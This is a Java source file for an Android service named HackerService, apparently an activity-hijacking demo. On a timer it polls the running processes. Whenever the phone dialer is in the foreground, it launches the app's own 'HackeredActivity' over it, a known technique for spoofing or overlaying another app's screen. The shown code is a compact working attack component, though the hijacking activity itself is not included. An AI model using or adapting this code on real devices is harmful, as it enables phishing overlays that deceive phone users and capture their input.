package com.example.whitebai.activityhacker;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class HackerService extends Service {
    private Boolean started = false;
    private Timer timer = new Timer();
    private TimerTask tasker = new TimerTask() {
            @Override
            public void run() {
                Log.d("log","run");
                ActivityManager activityManager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
                started=true;
                List<ActivityManager.RunningAppProcessInfo> infos = activityManager.getRunningAppProcesses();
                for(ActivityManager.RunningAppProcessInfo appProcessInfo:infos){
                    if(appProcessInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND)
                        if(appProcessInfo.processName.equals("com.android.phone")){
                            Log.d("log",appProcessInfo.processName);
                            Intent intent = new Intent(getBaseContext(),HackeredActivity.class);
                            intent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                            intent.putExtra("processname",appProcessInfo.processName);
                            startActivity(intent);
                        }
                }
            }
        };

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("log","onStartCommand");
        if(!started){
            timer.scheduleAtFixedRate(tasker,2000,1500);
        }
        return super.onStartCommand(intent, flags, startId);
    }
}
